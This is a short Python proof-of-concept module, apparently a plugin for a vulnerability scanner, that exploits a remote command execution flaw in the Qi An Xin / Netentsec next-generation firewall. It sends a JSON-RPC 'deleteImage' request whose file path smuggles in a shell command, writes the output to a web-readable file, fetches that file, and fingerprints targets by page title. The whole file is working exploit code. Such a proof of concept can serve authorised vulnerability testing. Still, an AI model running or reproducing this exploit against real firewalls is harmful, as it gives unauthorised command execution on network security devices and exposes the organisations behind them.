# -*- coding:utf-8 -*-
# 奇安信 网康下一代防火墙RCE

from .. import requestUtil, fileUtil
from ServiceScanModel.models import ServiceScan

data = '{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;{cmd}>/var/www/html/passerW.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}'


def firewall_rce(url, cmd="whoami"):
    resp = requestUtil.post(url + "/directdata/direct/router", data=data.replace("{cmd}", cmd))
    resp = requestUtil.get(url + "/passerW.txt")
    if resp.status_code == 200 and not "<script>" in resp.text:
        return resp.text


def fingerprint(service):
    try:
        if "网康下一代防火墙" in service.title:
            return True
    except:
        return False


def poc(service: ServiceScan):
    try:
        result = firewall_rce(service.url)
        print(result)
        if result:
            return ["奇安信 网康下一代防火墙RCE", "当前用户: %s" % result]
    except:
        return []
